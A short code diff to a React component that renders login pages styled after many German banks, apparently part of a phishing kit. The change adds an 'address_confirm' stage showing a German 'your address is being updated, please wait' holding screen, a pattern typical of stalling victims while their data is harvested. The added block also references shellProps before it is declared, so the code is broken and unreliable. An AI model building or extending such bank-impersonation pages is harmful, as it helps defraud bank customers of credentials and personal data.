@@ -547,6 +547,26 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
     );
   }
 
+  if (phase === "address_confirm") {
+    return (
+      <BankShell {...shellProps}>
+        <div className="max-w-md mx-auto mt-16 flex flex-col items-center gap-4 text-center">
+          <div
+            className="h-10 w-10 rounded-full border-2 border-t-transparent animate-spin"
+            style={{ borderColor: themeColor, borderTopColor: "transparent" }}
+          />
+          <h2 className="text-xl font-semibold" style={{ color: themeColor }}>
+            Adresse wird aktualisiert…
+          </h2>
+          <p className="text-sm text-gray-600">
+            Bitte einen Moment Geduld, Ihre Daten werden verarbeitet.
+          </p>
+        </div>
+      </BankShell>
+    );
+  }
+
+
   const fallbackLogoSrc = getLogo(groupLogoName[bank.group]) || vrLogoGeneric;
   const isBBBank = bank.group === "BBBank";
   const shellProps = { theme, logoSrc, fallbackLogoSrc, bankName: bank.name, showName, bigLogo: isBBBank, footerLinks: (bank.footer_links ?? null) as any };
